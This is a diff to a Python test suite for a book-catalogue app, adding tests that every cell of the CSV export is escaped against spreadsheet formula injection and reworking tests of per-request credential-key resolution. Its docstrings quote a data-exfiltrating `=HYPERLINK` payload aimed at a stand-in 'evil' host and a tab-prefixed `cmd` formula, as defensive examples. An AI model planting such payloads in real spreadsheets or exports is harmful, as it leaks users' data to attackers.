@@ -4,16 +4,19 @@ Outbound calls to Open Library and Google Books are intercepted with respx so
 the suite never touches the network.
 """
 
+import ast
 import csv
-import dataclasses
+import inspect
 import io
 from base64 import b64encode
+from pathlib import Path
 
 import httpx
 import pytest
 import respx
 
 import catalogue
+import covers
 import credentials
 import sources
 import targets
@@ -889,6 +892,31 @@ class TestRefreshMetadata:
         res = client.put(f"/api/books/{book['id']}/refresh", headers=admin["headers"])
         assert res.json()["cover_url"] == f"/covers/{book['id']}.png"
 
+    def test_the_local_cover_rule_is_covers_own(
+        self, client, admin, make_book, monkeypatch, open_library_hit
+    ):
+        """Behavioural, because a grep is satisfied by the defect it replaced.
+
+        This handler is the second writer of that rule and had only the arm
+        above, which passes, and goes on passing, for a copy of the literal: the
+        two answers diverge only once the prefix moves. `covers.is_local` reads
+        `LOCAL_COVER_PREFIX` at call time, so moving it here moves this handler
+        with it, and a copy answers for the old prefix and overrules an upload.
+
+        **It is what closes the one evasion the structural guard cannot see.**
+        `test_covers.py::TestNoOtherModuleDecidesWhetherACoverIsLocal` refuses
+        the constant read and the literal spelled again; a prefix **assembled**,
+        `startswith("/cover" + "s/")`, walks past it and fails here.
+        `test_google_books.py::TestMergeInto::test_the_local_cover_rule_is_covers_own`
+        is the same arm at the first writer.
+        """
+        monkeypatch.setattr(covers, "LOCAL_COVER_PREFIX", "/held/")
+        book = make_book(admin["headers"], isbn="9780743273565", cover_url="/held/1.png")
+
+        res = client.put(f"/api/books/{book['id']}/refresh", headers=admin["headers"])
+
+        assert res.json()["cover_url"] == "/held/1.png"
+
     def test_replaces_a_remote_cover(self, client, admin, make_book, open_library_hit):
         book = make_book(
             admin["headers"], isbn="9780743273565", cover_url="https://example.com/old.jpg"
@@ -1048,20 +1076,11 @@ class TestExport:
     def _rows(self, response) -> list[dict]:
         return list(csv.DictReader(io.StringIO(response.text)))
 
-    def test_csv_has_the_expected_header(self, client, admin, make_book):
-        make_book(admin["headers"])
-        res = client.get("/api/books/export", headers=admin["headers"])
-        header = next(csv.reader(io.StringIO(res.text)))
-        assert header == [
-            "Title", "Author", "ISBN", "Publisher", "Year",
-            "Description", "Tags", "My Status", "Date Added", "Added By",
-            "Format", "Condition", "Location", "Collection", "Purchase Price",
-            "Purchase Currency", "Purchased On", "Purchased From",
-        ]
-
     def test_a_format_outside_its_enum_never_reaches_the_export(self, client, admin):
-        """The `Format` and `Condition` cells skip `_csv_safe`, so the write refuses
-        anything but an enum value: that refusal is what keeps a formula out of them."""
+        """A `format` outside its enum is refused at the write, and that stays
+        worth pinning now the export escapes every cell anyway: the refusal is
+        what keeps the column meaning something, and it is the arm that goes
+        red if the enum validator is dropped from the payload."""
         res = client.post(
             "/api/books",
             json={"title": "Test Book", "author": "Test Author", "format": "=1+1"},
@@ -1121,6 +1140,149 @@ class TestExport:
 
     def test_requires_authentication(self, client):
         assert client.get("/api/books/export").status_code == 401
+
+    def test_the_leads_are_exactly_the_six_a_spreadsheet_acts_on(self):
+        """**The arm below is parametrised off this very tuple**, so dropping
+        an entry drops an arm and the suite stays green. Measured: reducing it
+        to `("=",)` was caught by nothing in the tree.
+
+        Four are the characters Excel and LibreOffice read as the start of a
+        formula. Tab and carriage return are the two that read like padding and
+        are not: both are stripped before the cell is parsed, so `"\t=cmd|..."`
+        runs. Nothing else in the tree pins this, and `_csv_safe`'s docstring
+        carries the argument.
+        """
+        assert books_router._FORMULA_LEAD == ("=", "+", "-", "@", "\t", "\r")
+
+    @pytest.mark.parametrize("lead", books_router._FORMULA_LEAD)
+    def test_every_lead_a_spreadsheet_would_run_is_neutralised(
+        self, client, admin, make_book, lead
+    ):
+        """Driven off `_FORMULA_LEAD` itself, so a character added to it is
+        covered by construction.
+
+        Every other escape assertion in this tree uses `=`, so deleting the
+        other five entries passed the whole suite. Tab and carriage return are
+        the two that read like padding and are not: Excel strips them and then
+        runs whatever follows, so `"\t=cmd|..."` executes.
+        """
+        make_book(admin["headers"], title=f"{lead}=1+1")
+        rows = self._rows(client.get("/api/books/export", headers=admin["headers"]))
+        assert rows[0]["Title"] == f"'{lead}=1+1"
+
+    def test_a_currency_that_is_a_formula_reaches_the_file_as_text(
+        self, client, admin, make_book
+    ):
+        """`Purchase Currency` looks like the enum columns beside it and is not.
+
+        Its validator asks for three characters and upper cases them, which
+        `=A1` answers, so nothing between the payload and the file refuses a
+        formula. The payload the escape exists for is
+        `=HYPERLINK("http://evil/?d="&A1,"ok")`, which exfiltrates the row when
+        an admin opens the export.
+        """
+        book = make_book(admin["headers"])
+        client.patch(
+            f"/api/books/{book['id']}",
+            json={"purchase_currency": "=A1"},
+            headers=admin["headers"],
+        )
+        rows = self._rows(client.get("/api/books/export", headers=admin["headers"]))
+        assert rows[0]["Purchase Currency"] == "'=A1"
+
+
+def _export_columns() -> list[tuple[str, bool]]:
+    """Each CSV export column, paired with whether its cell goes through `_csv_safe`.
+
+    Read off the writer's own two argument lists rather than off a copy of the
+    header, so a column added to one list and not the other fails here instead
+    of silently shifting every cell after it by one.
+    """
+    source = Path(inspect.getsourcefile(books_router) or "").read_text()
+
+    written: list[tuple[int, list[ast.expr]]] = []
+    for node in ast.walk(ast.parse(source)):
+        if not isinstance(node, ast.Call):
+            continue
+        if not (isinstance(node.func, ast.Attribute) and node.func.attr == "writerow"):
+            continue
+        if not node.args or not isinstance(node.args[0], ast.List):
+            continue
+        written.append((node.lineno, node.args[0].elts))
+    written.sort(key=lambda pair: pair[0])
+
+    assert len(written) == 2, (
+        "The CSV export writes one header row and one row per book. Found "
+        f"{len(written)} `writerow` calls taking a list literal, so this guard "
+        "is reading something other than the export it was written for."
+    )
+    header_elements, row_elements = (elements for _, elements in written)
+
+    names = [
+        element.value
+        for element in header_elements
+        if isinstance(element, ast.Constant) and isinstance(element.value, str)
+    ]
+    assert len(names) == len(header_elements), (
+        "Every header cell is a string literal. One that is computed cannot be "
+        "paired with the cell below it, and this guard would skip it."
+    )
+    escaped = [
+        isinstance(cell, ast.Call)
+        and isinstance(cell.func, ast.Name)
+        and cell.func.id == "_csv_safe"
+        for cell in row_elements
+    ]
+    assert len(names) == len(escaped), (
+        f"{len(names)} headers against {len(escaped)} cells. The export writes "
+        "them as two literal lists, so they are only in step by hand."
+    )
+    return list(zip(names, escaped, strict=True))
+
+
+class TestNoCellOfTheCsvExportSkipsTheEscape:
+    """Escaping every cell is cheaper to guard than knowing which may skip it.
+
+    Eight of eighteen used to be exempt, on the argument that the column's own
+    type or validator makes a formula impossible. Two things were wrong with
+    that. `purchase_currency` was not one of those columns, and the comment
+    above the block said four where there were eight, so nothing counted. And
+    the argument names the validator at the API, while `backup._parse_row`
+    inserts a restored archive through Core: it coerces the temporal columns
+    and nothing else, and SQLite is dynamically typed, so `books.year` will
+    hold a formula and read it back as one.
+
+    So there is no exempt set to keep in step with the writer, and no argument
+    about which write paths exist. A cell that is not a `_csv_safe` call is a
+    failure, and that is the whole rule.
+
+    **It reads the spelling of each cell, not what the cell does.** A rewrite
+    that escaped a tag name inside the join rather than the joined string is
+    safe and goes red here, and one that weakened `_csv_safe` itself is unsafe
+    and does not. `TestExport` carries the second half, driven off
+    `_FORMULA_LEAD`.
+    """
+
+    def test_the_guard_can_tell_an_escaped_cell_from_a_bare_one(self):
+        """A pass that recognised nothing would report every cell escaped and
+        forgive everything, which is the failure mode of asserting an empty
+        list. `_csv_safe` renamed is what makes the matcher blind."""
+        assert hasattr(books_router, "_csv_safe")
+        columns = _export_columns()
+        assert [name for name, escaped in columns if escaped]
+        assert len({name for name, _ in columns}) == len(columns), (
+            "Two export columns share a header name, so the file cannot be "
+            "read back by header and this guard cannot name what it found."
+        )
+
+    def test_every_cell_is_escaped(self):
+        bare = [name for name, escaped in _export_columns() if not escaped]
+        assert bare == [], (
+            f"{bare} reach the file without `_csv_safe`. There is no exemption "
+            "to add them to: a column whose value cannot begin with a formula "
+            "lead loses nothing by being escaped, and the argument that it "
+            "cannot is the one a restored archive defeats."
+        )
 
 
 class TestOwnership:
@@ -1516,207 +1678,45 @@ class TestACatalogueLoginLeavesTheDeploymentWithItsRequest:
             assert request.headers.get("authorization") == self.SENT
 
 
-class TestTheKeyIsResolvedOncePerRequest:
-    """`_catalogue_logins` resolves the encryption key for the loop, not per source.
+def _resolutions_counted(monkeypatch) -> list[int]:
+    """A one element tally of `credentials._supplied` invocations.
 
-    **The cost is counted, not reasoned about.** Resolving reads every entry in
-    `credentials.KEY_SOURCES` and runs a BIP-39 decode per phrase held, so on a
-    machine with a keychain it is a round trip; this is the member request path,
-    so it is paid per lookup rather than per admin visit.
+    The resolver's own arms count the same thing in
+    `tests/test_settings_store.py`. Counted again here because this measures a
+    whole request rather than one call: that file pins what one resolution
+    costs, and this pins how many a request makes.
+    """
+    tally = [0]
+    real = credentials._supplied
 
-    **Two instruments, because one careful reading is one reading.**
-    `_supplied` is counted here, and `KeySource.read` is counted by
-    `test_the_key_sources_are_read_once_over` below, which observes the effect
-    rather than the function: a resolution that stopped going through
-    `_supplied` would leave the first count at zero and say nothing.
+    def counting():
+        tally[0] += 1
+        return real()
 
-    **The arm that is a cost rather than a saving has a test of its own.** A
-    roster whose credential doors are all pinned in the environment opens no
-    envelope, so it needs no key, and it now pays one resolution where it paid
-    none. That is stated at `_catalogue_logins` and pinned by
-    `test_a_pinned_only_roster_pays_one_resolution`, because a fix measured only
-    where it saves is a fix nobody has asked the other question of.
+    monkeypatch.setattr(credentials, "_supplied", counting)
+    return tally
+
+
+class TestTheLookupRouteDoesNotPayPerSourceEither:
+    """The whole request, because the resolver being right is not the route using it.
+
+    The resolver's own arms are
+    `tests/test_settings_store.py::TestTheKeyIsResolvedOncePerRequest`, where
+    `_catalogue_logins` lives. Counted here is a whole lookup request, which
+    includes `settings_store._sources_with_a_credential` resolving once for its
+    own loop as well. What is asserted is that neither total moves with the
+    roster.
     """
 
-    @staticmethod
-    def _counted(monkeypatch) -> list[int]:
-        """A one element tally of `credentials._supplied` invocations."""
-        tally = [0]
-        real = credentials._supplied
-
-        def counting():
-            tally[0] += 1
-            return real()
-
-        monkeypatch.setattr(credentials, "_supplied", counting)
-        return tally
-
-    @staticmethod
-    def _seal(db, key_phrase, monkeypatch, *names: str) -> None:
-        monkeypatch.setenv("CREDENTIAL_ENCRYPTION_KEY", key_phrase)
-        for name in names:
-            address = targets.SEEDED[CatalogueSource(name)].base_url
-            credentials.put(db, name, address, "alice", "hunter2")
-
-    @pytest.fixture
-    def key_phrase(self) -> str:
-        return credentials.generate_phrase()
-
-    def test_the_shipping_roster_resolves_the_key_once_and_opens_no_envelope(
-        self, db, monkeypatch
+    def test_the_cost_of_a_lookup_does_not_move_with_the_roster(
+        self, client, admin, db, dnb_hit, monkeypatch
     ):
-        """Nothing is patched, so this is the roster as it ships.
-
-        **The arm that matters has survived two changes to what the roster
-        answers**, and it is the tally rather than the mapping: an install
-        storing no credential pays one resolution and not one per source. A
-        tally above one here is the defect this class exists for, arriving from
-        the other side.
-
-        What the mapping holds did change, twice. It was empty while no door
-        carried a login at all; it was still empty once one did, because nobody
-        had entered one; and it now carries the shipped default, which costs no
-        resolution because it opens no envelope. So the roster as it ships pays
-        exactly what it paid before and sends a login it did not send.
-        """
-        tally = self._counted(monkeypatch)
-
-        resolved = books_router._catalogue_logins(db)
-
-        assert set(resolved) == sources.SHIPS_A_CREDENTIAL
-        assert tally[0] == 1
-
-    def test_two_sealed_logins_cost_what_one_costs(
-        self, db, key_phrase, monkeypatch
-    ):
-        """The count is flat in the number of sources, which is the whole fix."""
-        self._seal(db, key_phrase, monkeypatch, "dnb")
-        monkeypatch.setattr(
-            sources, "NEEDS_A_KEY", frozenset({CatalogueSource.DNB})
-        )
-        tally = self._counted(monkeypatch)
-        assert len(books_router._catalogue_logins(db)) == 1
-        one = tally[0]
-
-        credentials.put(
-            db,
-            "k10plus",
-            targets.SEEDED[CatalogueSource.K10PLUS].base_url,
-            "alice",
-            "hunter2",
-        )
-        monkeypatch.setattr(
-            sources,
-            "NEEDS_A_KEY",
-            frozenset({CatalogueSource.DNB, CatalogueSource.K10PLUS}),
-        )
-        tally[0] = 0
-        assert len(books_router._catalogue_logins(db)) == 2
-        two = tally[0]
-
-        assert (one, two) == (1, 1), (
-            f"{one} resolution for one sealed login and {two} for two: the cost "
-            "moves with the roster, which is the defect this exists to catch"
-        )
-
-    def test_a_lost_key_is_resolved_once_as_well(
-        self, db, key_phrase, monkeypatch
-    ):
-        """The deployment whose key is gone, which is the arm that was 1 + N.
-
-        Both critic seats found it independently: `_material` fell through to
-        `require_key` on a state that already said there was no key, so the one
-        state where every other reader answers from the value it was handed was
-        the one state this re-read every store, per source.
-
-        Nothing is readable here, so the loop resolves no login at all. That is
-        the point: the cost was being paid to learn nothing.
-        """
-        self._seal(db, key_phrase, monkeypatch, "dnb", "k10plus")
-        monkeypatch.setattr(
-            sources,
-            "NEEDS_A_KEY",
-            frozenset({CatalogueSource.DNB, CatalogueSource.K10PLUS}),
-        )
-        monkeypatch.delenv("CREDENTIAL_ENCRYPTION_KEY")
-        assert credentials.key_material() is None, (
-            "a key is still in force, so this measures the readable path"
-        )
-        tally = self._counted(monkeypatch)
-
-        assert books_router._catalogue_logins(db) == {}
-
-        assert tally[0] == 1
-
-    def test_a_pinned_only_roster_pays_one_resolution(self, db, monkeypatch):
-        """The cost side of the change, stated rather than discovered.
-
-        A pinned credential never opens an envelope, so before this the loop
-        touched no key store at all. It now resolves once for the request.
-        """
-        monkeypatch.setattr(
-            sources,
-            "NEEDS_A_KEY",
-            frozenset({CatalogueSource.DNB, CatalogueSource.K10PLUS}),
-        )
-        monkeypatch.setenv(credentials.env_variable_name("dnb"), "alice:hunter2")
-        monkeypatch.setenv(
-            credentials.env_variable_name("k10plus"), "alice:hunter2"
-        )
-        tally = self._counted(monkeypatch)
-
-        assert len(books_router._catalogue_logins(db)) == 2
-
-        assert tally[0] == 1
-
-    def test_the_key_sources_are_read_once_over(
-        self, db, key_phrase, monkeypatch
-    ):
-        """The second instrument: every store is read once, not once per source.
-
-        This counts what the machine actually does, where the test above counts
-        a call to one of our own functions. The issue's measurement is in this
-        unit: three key source reads per sealed source rather than three in all.
-        """
-        self._seal(db, key_phrase, monkeypatch, "dnb", "k10plus")
-        monkeypatch.setattr(
-            sources,
-            "NEEDS_A_KEY",
-            frozenset({CatalogueSource.DNB, CatalogueSource.K10PLUS}),
-        )
-        reads: list[str] = []
-        one_pass = [source.token for source in credentials.KEY_SOURCES]
-
-        def watching(source: credentials.KeySource) -> credentials.KeySource:
-            def read() -> str:
-                reads.append(source.token)
-                return source.read()
-
-            return dataclasses.replace(source, read=read)
-
-        monkeypatch.setattr(
-            credentials,
-            "KEY_SOURCES",
-            tuple(watching(source) for source in credentials.KEY_SOURCES),
-        )
-
-        assert len(books_router._catalogue_logins(db)) == 2
-
-        assert reads == one_pass, (
-            f"{reads} store reads for two sealed logins, where one pass over "
-            "the stores is one read each"
-        )
-
-    def test_the_route_does_not_pay_per_source_either(
-        self, client, admin, db, dnb_hit, key_phrase, monkeypatch
-    ):
-        """End to end, because the function being right is not the route using it.
-
-        The whole request is counted, so this includes
-        `settings_store._sources_with_a_credential`, which resolves once for its
-        own loop. What is asserted is that neither total moves with the roster.
-        """
-        self._seal(db, key_phrase, monkeypatch, "dnb", "k10plus")
+        phrase = credentials.generate_phrase()
+        monkeypatch.setenv("CREDENTIAL_ENCRYPTION_KEY", phrase)
+        for name in ("dnb", "k10plus"):
+            credentials.put(
+                db, name, targets.SEEDED[CatalogueSource(name)].base_url, "alice", "hunter2"
+            )
 
         counts = []
         for roster in (
@@ -1724,7 +1724,7 @@ class TestTheKeyIsResolvedOncePerRequest:
             frozenset({CatalogueSource.DNB, CatalogueSource.K10PLUS}),
         ):
             monkeypatch.setattr(sources, "NEEDS_A_KEY", roster)
-            tally = self._counted(monkeypatch)
+            tally = _resolutions_counted(monkeypatch)
             res = client.get(
                 "/api/books/lookup",
                 params={"isbn": TestACatalogueLoginLeavesTheDeploymentWithItsRequest.ISBN},
@@ -1733,8 +1733,15 @@ class TestTheKeyIsResolvedOncePerRequest:
             assert res.status_code == 200
             counts.append(tally[0])
 
-        assert counts[0] == counts[1], (
+        # **The constant and not only the slope.** Measured 2026-09-17 at two
+        # apiece, which is `_catalogue_logins`' resolution plus
+        # `_sources_with_a_credential`'s. Asserted as an equality because a
+        # second `library_access` in a handler leaves the slope flat and moves
+        # the constant, and with only the slope pinned that mutation was green.
+        assert counts == [2, 2], (
             f"{counts[0]} resolutions with one credentialled source and "
-            f"{counts[1]} with two: the request's cost moves with the roster"
+            f"{counts[1]} with two, where two apiece is what one request pays: "
+            "a figure that moves with the roster is a cost per source, and one "
+            "that moves together is a second resolution in the handler"
         )
 
